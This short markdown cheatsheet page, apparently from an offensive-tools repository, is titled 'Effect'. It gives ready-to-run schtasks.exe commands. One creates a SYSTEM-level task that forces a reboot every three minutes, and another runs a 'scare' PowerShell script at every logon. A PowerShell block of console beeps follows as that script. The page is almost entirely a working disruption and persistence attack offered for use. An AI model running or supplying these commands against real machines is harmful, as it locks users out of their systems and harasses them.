<p align="right">
  <a href="/README.md">Home Page</a> |
  <a href="/CheatSheets/effect.md#table-of-contents">Top of Page</a> |
  <a href="/CheatSheets/effect.md#rolling-reboot">Bottom of Page</a>
</p>

# Cheatsheets - Effect
## Table of Contents
* [Scheduled Tasks](#scheduled-tasks)
  * [Rolling Reboot](#rolling-reboot) 

## Scheduled Tasks
### Rolling Reboot
```bash
schtasks.exe /create /ru "SYSTEM" /sc minute /mo 3 /tn "Rolling Reboot" /tr "shutdown /r /t 000" 
schtasks.exe /create /sc onlogon /tn "Scare" /tr "powershell -c 'C:\scare.ps1'"
```
```pwsh
[console]::beep(440,500)
[console]::beep(440,500)
[console]::beep(440,500)
[console]::beep(349,350)
[console]::beep(523,150)
[console]::beep(440,500)
[console]::beep(349,350)
[console]::beep(523,150)
[console]::beep(440,1000)
[console]::beep(659,500)
[console]::beep(659,500)
[console]::beep(659,500)
[console]::beep(349,350)
[console]::beep(523,150)
[console]::beep(659,500)
[console]::beep(349,350)
[console]::beep(523,150)
[console]::beep(440,1000)
```
